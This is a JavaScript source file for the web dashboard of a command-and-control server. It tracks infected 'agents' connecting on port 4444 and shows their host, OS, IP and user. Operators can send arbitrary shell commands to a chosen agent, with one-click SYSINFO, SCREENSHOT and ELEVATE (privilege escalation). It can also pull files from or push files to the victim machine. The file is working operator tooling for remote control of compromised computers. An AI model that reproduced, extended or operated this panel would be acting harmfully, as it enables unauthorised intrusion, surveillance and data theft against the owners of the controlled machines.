const state = {
    activeSection: "dashboard",
    serverRunning: false,
    serverHost: "0.0.0.0",
    serverPort: 4444,
    serverAddress: "",
    sessionKey: "",
    uptime: "",
    serverStartedAt: null,
    agentList: [],
    selectedAgentId: null,
    cmdOutput: [],
    logs: [],
    lastLogCount: 0,
    lastScrollY: 0,
    startBusy: false
};

let pollInterval = null;
let clockInterval = null;
let uptimeInterval = null;

const pageTitles = {
    dashboard: "Dashboard",
    server: "Server Config",
    agents: "Agents",
    command: "Console",
    logs: "Logs",
    about: "About"
};

const quickCmds = [
    { cmd: "SYSINFO", icon: "fas fa-info", label: "Sys Info" },
    { cmd: "ls -la", icon: "fas fa-folder-open", label: "List Files" },
    { cmd: "ifconfig", icon: "fas fa-network-wired", label: "Network" },
    { cmd: "whoami", icon: "fas fa-user-circle", label: "User Info" },
    { cmd: "ps aux", icon: "fas fa-tasks", label: "Processes" },
    { cmd: "SCREENSHOT", icon: "fas fa-camera", label: "Screenshot" },
    { cmd: "ELEVATE", icon: "fas fa-arrow-up", label: "Elevate" }
];

function escHtml(s) {
    return String(s)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;");
}

function copyText(text, btnEl) {
    let done = function () {
        if (!btnEl) return;
        let original = btnEl.innerHTML;
        btnEl.innerHTML = '<i class="fas fa-check"></i> Copied!';
        btnEl.disabled = true;
        setTimeout(function () {
            btnEl.innerHTML = original;
            btnEl.disabled = false;
        }, 2000);
    };
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard
            .writeText(text)
            .then(done)
            .catch(function () {
                fallbackCopy(text);
                done();
            });
    } else {
        fallbackCopy(text);
        done();
    }
}

function fallbackCopy(text) {
    let ta = document.createElement("textarea");
    ta.value = text;
    ta.style.cssText = "position:fixed;opacity:0;top:0;left:0";
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    try {
        document.execCommand("copy");
    } catch (e) {}
    document.body.removeChild(ta);
}

function navigate(section) {
    state.activeSection = section;
    document.querySelectorAll(".section").forEach(function (el) {
        el.classList.remove("active");
    });
    let target = document.getElementById("section-" + section);
    if (target) target.classList.add("active");
    document.querySelectorAll("[data-nav]").forEach(function (el) {
        el.classList.toggle("active", el.dataset.nav === section);
    });
    let title = pageTitles[section] || "";
    let mobileTitle = document.getElementById("mobile-title");
    if (mobileTitle) mobileTitle.textContent = title;
    let topbarTitle = document.getElementById("topbar-title");
    if (topbarTitle) topbarTitle.textContent = title;
    if (typeof closeSidebar === "function") closeSidebar();
    if (section === "agents") updateTopology();
}

function updateClock() {
    let t = new Date().toLocaleTimeString("en-US", { hour12: false });
    let c1 = document.getElementById("topnav-clock");
    if (c1) c1.textContent = t;
    let c2 = document.getElementById("mobile-clock");
    if (c2) c2.textContent = t;
}

function tickUptime() {
    if (!state.serverStartedAt || !state.serverRunning) return;
    let now = Date.now();
    let elapsed = Math.floor(now / 1000 - state.serverStartedAt);
    let h = Math.floor(elapsed / 3600);
    let m = Math.floor((elapsed % 3600) / 60);
    let s = elapsed % 60;
    let display =
        String(h).padStart(2, "0") +
        ":" +
        String(m).padStart(2, "0") +
        ":" +
        String(s).padStart(2, "0");
    if (display !== state.uptime) {
        state.uptime = display;
        let el = document.getElementById("stat-uptime");
        if (el) el.textContent = display;
    }
    let msIntoSecond = now % 1000;
    let msUntilNext = msIntoSecond === 0 ? 1000 : 1000 - msIntoSecond;
    uptimeInterval = setTimeout(tickUptime, msUntilNext);
}

function startUptimeTicker() {
    if (uptimeInterval) {
        clearTimeout(uptimeInterval);
        uptimeInterval = null;
    }
    tickUptime();
}

function stopUptimeTicker() {
    if (uptimeInterval) {
        clearTimeout(uptimeInterval);
        uptimeInterval = null;
    }
    state.serverStartedAt = null;
    state.uptime = "";
    let el = document.getElementById("stat-uptime");
    if (el) el.textContent = "00:00:00";
}

function updateServerBtns() {
    let running = state.serverRunning;
    document.querySelectorAll(".server-toggle").forEach(function (btn) {
        btn.classList.toggle("online", running);
    });
    let cardBtn = document.getElementById("server-toggle-btn");
    if (cardBtn) {
        cardBtn.innerHTML = running
            ? '<i class="fas fa-stop"></i> Stop Server'
            : '<i class="fas fa-play"></i> Start Server';
    }
}

function updateSphere() {
    let online = state.serverRunning;
    let core = document.querySelector(".sphere-core");
    let pulse = document.querySelector(".sphere-pulse");
    if (core) core.classList.toggle("online", online);
    if (pulse) pulse.classList.toggle("active", online);
    let val = document.getElementById("sphere-val");
    if (val) {
        val.textContent = online ? "ONLINE" : "OFFLINE";
        val.classList.toggle("online", online);
    }
    let detail = document.getElementById("sphere-detail");
    if (detail)
        detail.textContent = online
            ? "Listening on " + state.serverAddress
            : "Server not running";
}

function updateStats() {
    let sv = document.getElementById("stat-server-status");
    if (sv) {
        sv.className =
            "stat-val " + (state.serverRunning ? "online" : "offline");
        sv.innerHTML =
            '<span class="dot' +
            (state.serverRunning ? " online" : "") +
            '"></span>' +
            (state.serverRunning ? "Online" : "Offline");
    }
    let agentsEl = document.getElementById("stat-agents");
    if (agentsEl) agentsEl.textContent = state.agentList.length;
    let connEl = document.getElementById("stat-connections");
    if (connEl) connEl.textContent = state.agentList.length;
    ["server-address-val", "server-address-val2"].forEach(function (id) {
        let el = document.getElementById(id);
        if (el) el.textContent = state.serverAddress || "XXX.XXX.XXX.XXX";
    });
    ["session-key-val", "session-key-val2"].forEach(function (id) {
        let el = document.getElementById(id);
        if (el)
            el.textContent = state.sessionKey
                ? state.sessionKey.substring(0, 32) +
                  (state.sessionKey.length > 32 ? "..." : "")
                : "XXXXXXXXXXXX";
    });
}

function updateAgentBadges() {
    let n = state.agentList.length;
    document.querySelectorAll(".agent-count-badge").forEach(function (el) {
        el.textContent = n;
        el.style.display = n ? "" : "none";
    });
}

function renderAgentCards() {
    let container = document.getElementById("agent-cards");
    if (!container) return;
    if (!state.agentList.length) {
        container.innerHTML =
            '<div class="empty-state"><i class="fas fa-satellite-dish"></i><div class="empty-title">NO ACTIVE AGENTS</div><div class="empty-text">Waiting for agents to connect...</div></div>';
        return;
    }
    container.innerHTML = state.agentList
        .map(function (a) {
            return (
                '<div class="agent-card' +
                (state.selectedAgentId === a.ID ? " selected" : "") +
                '" data-id="' +
                a.ID +
                '">' +
                '<div class="agent-id">[ AGENT-' +
                escHtml(a.ID) +
                " ]</div>" +
                '<div class="agent-meta">' +
                '<span class="mk">HOST</span><span class="mv">' +
                escHtml(a.Hostname || "-") +
                "</span>" +
                '<span class="mk">OS</span><span class="mv">' +
                escHtml(a.OS || "-") +
                "</span>" +
                '<span class="mk">IP</span><span class="mv">' +
                escHtml(a.AgentIP || a.IP || "-") +
                "</span>" +
                '<span class="mk">USER</span><span class="mv">' +
                escHtml(a.User || a.Username || "-") +
                "</span>" +
                "</div>" +
                '<button class="btn sm full" onclick="selectAndGo(' +
                a.ID +
                ')"><i class="fas fa-crosshairs"></i> Target Agent</button>' +
                "</div>"
            );
        })
        .join("");
    container.querySelectorAll(".agent-card").forEach(function (card) {
        card.addEventListener("click", function (e) {
            if (e.target.closest("button")) return;
            selectAgent(parseInt(card.dataset.id));
        });
    });
}

function updateTargetBadge() {
    let badge = document.getElementById("target-badge");
    if (!badge) return;
    if (state.selectedAgentId != null) {
        badge.className = "target-badge";
        badge.innerHTML =
            '<i class="fas fa-dot-circle"></i> AGENT-' + state.selectedAgentId;
    } else {
        badge.className = "target-badge none";
        badge.innerHTML = '<i class="fas fa-dot-circle"></i> NONE SELECTED';
    }
}

function selectAgent(id) {
    state.selectedAgentId = id;
    renderAgentCards();
    updateTargetBadge();
}

function selectAndGo(id) {
    state.selectedAgentId = id;
    renderAgentCards();
    updateTargetBadge();
    navigate("command");
}

async function toggleServer() {
    if (state.startBusy) return;
    state.startBusy = true;
    try {
        state.serverRunning ? await stopServer() : await startServer();
    } finally {
        setTimeout(function () {
            state.startBusy = false;
        }, 1500);
    }
}

async function startServer() {
    let hostEl = document.getElementById("input-host");
    let portEl = document.getElementById("input-port");
    let host = hostEl ? hostEl.value.trim() : state.serverHost;
    let port = portEl ? parseInt(portEl.value) : state.serverPort;
    state.serverHost = host;
    state.serverPort = port;
    addLog("Starting server on " + host + ":" + port + "...", "info");
    try {
        let r = await fetch("/api/server/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ Host: host, Port: port })
        });
        let d = await r.json();
        if (d.Success) {
            state.serverRunning = true;
            state.serverAddress = d.Host + ":" + d.Port;
            state.sessionKey = d.Key || "";
            state.serverStartedAt = d.StartedAt || Date.now() / 1000;
            addLog(
                "Server started successfully on " + state.serverAddress,
                "success"
            );
            startPolling();
            startUptimeTicker();
            updateServerBtns();
            updateSphere();
            updateStats();
        } else {
            addLog("Error: " + d.Message, "error");
        }
    } catch (e) {
        addLog("Failed to reach server API: " + e.message, "error");
    }
}

async function stopServer() {
    addLog("Stopping server...", "warn");
    try {
        let r = await fetch("/api/server/stop", { method: "POST" });
        let d = await r.json();
        if (d.Success) {
            state.serverRunning = false;
            state.serverAddress = "";
            state.sessionKey = "";
            state.agentList = [];
            state.selectedAgentId = null;
            state.lastLogCount = 0;
            addLog("Server stopped", "warn");
            stopPolling();
            stopUptimeTicker();
            updateServerBtns();
            updateSphere();
            updateStats();
            renderAgentCards();
            updateTargetBadge();
            updateTopology();
        } else {
            addLog("Stop error: " + d.Message, "error");
        }
    } catch (e) {
        addLog("Failed to reach server API: " + e.message, "error");
    }
}

function startPolling() {
    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(async function () {
        await refreshServerStatus();
        await refreshAgents();
        await refreshLogs();
    }, 1500);
}

function stopPolling() {
    if (pollInterval) {
        clearInterval(pollInterval);
        pollInterval = null;
    }
}

async function refreshServerStatus() {
    try {
        let d = await (await fetch("/api/server/status")).json();
        if (d.Status === "Online") {
            state.serverRunning = true;
            if (d.Host && d.Port) state.serverAddress = d.Host + ":" + d.Port;
            if (d.Key) state.sessionKey = d.Key;
            if (d.StartedAt) {
                if (d.StartedAt !== state.serverStartedAt) {
                    state.serverStartedAt = d.StartedAt;
                    startUptimeTicker();
                }
            } else if (!state.serverStartedAt) {
                state.serverStartedAt = Date.now() / 1000;
                startUptimeTicker();
            }
            updateStats();
        } else if (d.Status === "Offline" && state.serverRunning) {
            state.serverRunning = false;
            addLog("Server went offline unexpectedly", "error");
            stopUptimeTicker();
            updateServerBtns();
            updateSphere();
            updateStats();
        }
    } catch (e) {}
}

async function refreshAgents() {
    try {
        let d = await (await fetch("/api/agents")).json();
        let incoming = d.Agents || [];
        let curIds = new Set(
            state.agentList.map(function (a) {
                return a.ID;
            })
        );
        let newIds = new Set(
            incoming.map(function (a) {
                return a.ID;
            })
        );
        incoming.forEach(function (a) {
            if (!curIds.has(a.ID)) {
                state.agentList.push(a);
                addLog(
                    "Agent connected: " +
                        (a.Hostname || a.ID) +
                        " (" +
                        (a.AgentIP || a.IP || "") +
                        ")",
                    "success"
                );
            }
        });
        state.agentList = state.agentList.filter(function (a) {
            return newIds.has(a.ID);
        });
        renderAgentCards();
        updateStats();
        updateAgentBadges();
        updateTopology();
    } catch (e) {}
}

async function refreshLogs() {
    try {
        let d = await (await fetch("/api/logs")).json();
        let serverLogs = d.Logs || [];
        if (serverLogs.length > state.lastLogCount) {
            serverLogs.slice(state.lastLogCount).forEach(function (entry) {
                let msg =
                    typeof entry === "string"
                        ? entry
                        : entry.Message || String(entry);
                let level =
                    typeof entry === "object" ? entry.Level || "info" : "info";
                let ts = typeof entry === "object" ? entry.Time || null : null;
                addLog("[SERVER] " + msg, level, ts);
            });
            state.lastLogCount = serverLogs.length;
        }
    } catch (e) {}
}

function addLog(msg, level, time) {
    if (level === undefined) level = "info";
    let ts = time || new Date().toLocaleTimeString("en-US", { hour12: false });
    state.logs.push({ msg: msg, level: level, time: ts });
    if (state.logs.length > 500) state.logs = state.logs.slice(-500);
    renderLogs();
}

function renderLogs() {
    let el = document.getElementById("log-container");
    if (!el) return;
    if (!state.logs.length) {
        el.innerHTML =
            '<div class="empty-state" style="min-height:140px"><i class="fas fa-clipboard-list"></i><div class="empty-text">No log entries yet</div></div>';
        return;
    }
    el.innerHTML = state.logs
        .map(function (e) {
            let badge = "[" + e.time + "] [" + e.level.toUpperCase() + "]";
            return (
                '<div class="log-entry ' +
                escHtml(e.level) +
                '"><span class="log-time">' +
                escHtml(badge) +
                '</span><span class="log-msg">' +
                escHtml(e.msg) +
                "</span></div>"
            );
        })
        .join("");
    el.scrollTop = el.scrollHeight;
}

function copyLogs(btnEl) {
    copyText(
        state.logs
            .map(function (l) {
                return (
                    "[" + l.time + "] [" + l.level.toUpperCase() + "] " + l.msg
                );
            })
            .join("\n"),
        btnEl
    );
}

function clearLogs() {
    state.logs = [];
    state.lastLogCount = 0;
    fetch("/api/logs/clear", { method: "POST" }).catch(function () {});
    renderLogs();
}

function appendOutput(text, type) {
    if (type === undefined) type = "out";
    state.cmdOutput.push({ text: text, type: type });
    let el = document.getElementById("terminal-output");
    if (el) {
        text.split("\n").forEach(function (line, i) {
            let div = document.createElement("div");
            div.className = "term-line " + type;
            div.textContent = i > 0 && line !== "" ? "  " + line : line;
            el.appendChild(div);
        });
        el.scrollTop = el.scrollHeight;
    }
}

async function executeCommand() {
    let inp = document.getElementById("cmd-input");
    let raw = inp ? inp.value.trim() : "";
    if (!raw) return;
    if (!state.selectedAgentId) {
        appendOutput(
            "[!] No agent selected. Go to Agents and target one first.",
            "err"
        );
        return;
    }
    inp.value = "";
    appendOutput("> " + raw, "cmd");
    try {
        let r = await fetch("/api/command/execute", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                AgentId: state.selectedAgentId,
                Command: raw
            })
        });
        let d = await r.json();
        appendOutput(
            d.Success ? d.Output || "" : "[!] " + d.Output,
            d.Success ? "out" : "err"
        );
    } catch (e) {
        appendOutput("[!] Request failed: " + e.message, "err");
    }
    appendOutput("─".repeat(48), "sep");
}

function quickCommand(cmd) {
    if (!state.selectedAgentId) {
        appendOutput("[!] No agent selected.", "err");
        navigate("command");
        return;
    }
    let inp = document.getElementById("cmd-input");
    if (inp) inp.value = cmd;
    executeCommand();
}

function copyOutput(btnEl) {
    copyText(
        state.cmdOutput
            .map(function (l) {
                return l.text;
            })
            .join("\n"),
        btnEl
    );
}

function clearOutput() {
    state.cmdOutput = [];
    let el = document.getElementById("terminal-output");
    if (el) el.innerHTML = "";
}

async function downloadFile() {
    let src = document.getElementById("adv-source")
        ? document.getElementById("adv-source").value.trim()
        : "";
    if (!state.selectedAgentId) {
        appendOutput("[!] No agent selected", "err");
        return;
    }
    if (!src) {
        appendOutput("[!] Specify source path", "err");
        return;
    }
    appendOutput("[+] Downloading: " + src, "cmd");
    try {
        let r = await fetch("/api/command/execute", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                AgentId: state.selectedAgentId,
                Command: "DOWNLOAD:" + src
            })
        });
        let d = await r.json();
        appendOutput(
            d.Success ? d.Output : "[!] " + d.Output,
            d.Success ? "ok" : "err"
        );
    } catch (e) {
        appendOutput("[!] Download failed", "err");
    }
}

async function uploadFile() {
    let src = document.getElementById("adv-source")
        ? document.getElementById("adv-source").value.trim()
        : "";
    let dst = document.getElementById("adv-dest")
        ? document.getElementById("adv-dest").value.trim()
        : "";
    if (!state.selectedAgentId) {
        appendOutput("[!] No agent selected", "err");
        return;
    }
    if (!src) {
        appendOutput("[!] Specify source path", "err");
        return;
    }
    if (!dst) {
        appendOutput("[!] Specify destination path", "err");
        return;
    }
    appendOutput("[+] Uploading: " + src + " → " + dst, "cmd");
    try {
        let r = await fetch("/api/command/execute", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                AgentId: state.selectedAgentId,
                Command: "UPLOAD:" + src + "|" + dst
            })
        });
        let d = await r.json();
        appendOutput(
            d.Success ? d.Output : "[!] " + d.Output,
            d.Success ? "ok" : "err"
        );
    } catch (e) {
        appendOutput("[!] Upload failed", "err");
    }
}

function svgEl(tag, attrs) {
    if (attrs === undefined) attrs = {};
    let el = document.createElementNS("http://www.w3.org/2000/svg", tag);
    Object.entries(attrs).forEach(function (entry) {
        el.setAttribute(entry[0], entry[1]);
    });
    return el;
}

function updateTopology() {
    let svg = document.getElementById("topologySvg");
    if (!svg) return;
    svg.innerHTML = "";
    let W = svg.clientWidth || 600;
    let H = parseInt(svg.getAttribute("height")) || 300;
    svg.setAttribute("viewBox", "0 0 " + W + " " + H);
    let defs = svgEl("defs");
    let pat = svgEl("pattern", {
        id: "tgrid",
        width: 28,
        height: 28,
        patternUnits: "userSpaceOnUse"
    });
    pat.appendChild(
        svgEl("path", {
            d: "M 28 0 L 0 0 0 28",
            fill: "none",
            stroke: "rgba(45,212,160,0.04)",
            "stroke-width": "1"
        })
    );
    defs.appendChild(pat);
    svg.appendChild(defs);
    svg.appendChild(
        svgEl("rect", { width: W, height: H, fill: "url(#tgrid)" })
    );
    if (!state.serverRunning && !state.agentList.length) {
        let t = svgEl("text", {
            x: W / 2,
            y: H / 2,
            "text-anchor": "middle",
            fill: "rgba(45,212,160,0.2)",
            "font-family": "Orbitron,monospace",
            "font-size": "12",
            "letter-spacing": "4"
        });
        t.textContent = "NO CONNECTIONS";
        svg.appendChild(t);
        return;
    }
    let cx = W / 2,
        cy = H / 2;
    state.agentList.forEach(function (agent, i) {
        let angle =
            (2 * Math.PI * i) / Math.max(state.agentList.length, 1) -
            Math.PI / 2;
        let radius = Math.min(W, H) * 0.3;
        let ax = cx + radius * Math.cos(angle);
        let ay = cy + radius * Math.sin(angle);
        svg.appendChild(
            svgEl("line", {
                x1: cx,
                y1: cy,
                x2: ax,
                y2: ay,
                stroke: "rgba(45,212,160,0.15)",
                "stroke-width": "1",
                "stroke-dasharray": "5 5"
            })
        );
        let pid = "pkt" + i;
        svg.appendChild(
            svgEl("path", {
                id: pid,
                d: "M" + cx + "," + cy + " L" + ax + "," + ay,
                fill: "none"
            })
        );
        let pkt = svgEl("circle", { r: "3", fill: "#2dd4a0", opacity: "0.85" });
        let anim = svgEl("animateMotion", {
            dur: 1.8 + i * 0.4 + "s",
            repeatCount: "indefinite"
        });
        let mp = svgEl("mpath");
        mp.setAttribute("href", "#" + pid);
        anim.appendChild(mp);
        pkt.appendChild(anim);
        svg.appendChild(pkt);
        drawNode(
            svg,
            ax,
            ay,
            "AGENT-" + agent.ID,
            agent.AgentIP || agent.IP || "",
            false,
            function () {
                selectAndGo(agent.ID);
            },
            state.selectedAgentId === agent.ID
        );
    });
    drawNode(
        svg,
        cx,
        cy,
        "C2 SERVER",
        state.serverHost + ":" + state.serverPort,
        true
    );
}

function drawNode(svg, x, y, label, sub, isServer, onClick, selected) {
    if (onClick === undefined) onClick = null;
    if (selected === undefined) selected = false;
    let g = svgEl("g");
    if (onClick) {
        g.style.cursor = "pointer";
        g.addEventListener("click", onClick);
    }
    let r = isServer ? 30 : 22;
    let color = isServer
        ? "#2dd4a0"
        : selected
          ? "#2dd4a0"
          : "rgba(148,163,184,0.4)";
    let fill = isServer ? "#1a2e24" : selected ? "#1d2e22" : "#1e2335";
    g.appendChild(
        svgEl("circle", {
            cx: x,
            cy: y,
            r: r + 7,
            fill: "none",
            stroke: isServer
                ? "rgba(45,212,160,0.25)"
                : selected
                  ? "rgba(45,212,160,0.4)"
                  : "rgba(148,163,184,0.12)",
            "stroke-width": "1",
            "stroke-dasharray": isServer ? "0" : "3 3"
        })
    );
    g.appendChild(
        svgEl("circle", {
            cx: x,
            cy: y,
            r: r,
            fill: fill,
            stroke: color,
            "stroke-width": "1.5"
        })
    );
    let fo = svgEl("foreignObject", {
        x: x - 12,
        y: y - 12,
        width: 24,
        height: 24
    });
    let div = document.createElement("div");
    div.style.cssText =
        "width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:13px;color:" +
        (isServer ? "#2dd4a0" : "#94a3b8") +
        ";";
    div.innerHTML =
        '<i class="fas ' + (isServer ? "fa-server" : "fa-laptop") + '"></i>';
    fo.appendChild(div);
    g.appendChild(fo);
    let lbl = svgEl("text", {
        x: x,
        y: y + r + 13,
        "text-anchor": "middle",
        fill: isServer ? "#2dd4a0" : "#cbd5e1",
        "font-family": "Orbitron,monospace",
        "font-size": "8.5",
        "font-weight": "700",
        "letter-spacing": "1"
    });
    lbl.textContent = label;
    g.appendChild(lbl);
    let sub2 = svgEl("text", {
        x: x,
        y: y + r + 23,
        "text-anchor": "middle",
        fill: "#475569",
        "font-family": "Share Tech Mono,monospace",
        "font-size": "8"
    });
    sub2.textContent = sub;
    g.appendChild(sub2);
    svg.appendChild(g);
}

function handleContentScroll(e) {
    let el = e.target;
    let st = el.scrollTop;
    let atBot = el.scrollHeight - st - el.clientHeight < 32;
    let down = st > state.lastScrollY;
    let bnav = document.querySelector(".bottom-nav");
    if (bnav) bnav.classList.toggle("hidden", atBot && down);
    if (bnav && !down) bnav.classList.remove("hidden");
    state.lastScrollY = st;
}

function renderQuickCmds() {
    let grid = document.getElementById("quick-grid");
    if (!grid) return;
    grid.innerHTML = quickCmds
        .map(function (qc) {
            return (
                '<button class="quick-btn" onclick="quickCommand(\'' +
                qc.cmd +
                "')\">" +
                '<i class="' +
                qc.icon +
                '"></i>' +
                qc.label +
                "</button>"
            );
        })
        .join("");
}

document.addEventListener("DOMContentLoaded", async function () {
    updateClock();
    clockInterval = setInterval(updateClock, 1000);
    renderQuickCmds();
    renderLogs();
    updateTargetBadge();

    document.querySelectorAll("[data-nav]").forEach(function (el) {
        el.addEventListener("click", function () {
            navigate(el.dataset.nav);
        });
    });

    let topbarServerBtn = document.getElementById("topbar-server-btn");
    if (topbarServerBtn)
        topbarServerBtn.addEventListener("click", toggleServer);

    let mobileServerBtn = document.getElementById("mobile-server-btn");
    if (mobileServerBtn)
        mobileServerBtn.addEventListener("click", toggleServer);

    let serverToggleBtn = document.getElementById("server-toggle-btn");
    if (serverToggleBtn)
        serverToggleBtn.addEventListener("click", toggleServer);

    let cmdInput = document.getElementById("cmd-input");
    if (cmdInput) {
        cmdInput.addEventListener("keydown", function (e) {
            if (e.key === "Enter") executeCommand();
        });
    }

    let contentEl = document.querySelector(".content");
    if (contentEl)
        contentEl.addEventListener("scroll", handleContentScroll, {
            passive: true
        });

    try {
        let d = await (await fetch("/api/server/status")).json();
        if (d.Status === "Online") {
            state.serverRunning = true;
            state.serverHost = d.Host;
            state.serverPort = d.Port;
            state.serverAddress = d.Host + ":" + d.Port;
            state.sessionKey = d.Key || "";
            state.serverStartedAt = d.StartedAt || null;
            updateServerBtns();
            updateSphere();
            updateStats();
            startPolling();
            if (state.serverStartedAt) startUptimeTicker();
            addLog(
                "Reconnected to running server at " + state.serverAddress,
                "success"
            );
        }
    } catch (e) {}

    updateTopology();
    navigate("dashboard");
});
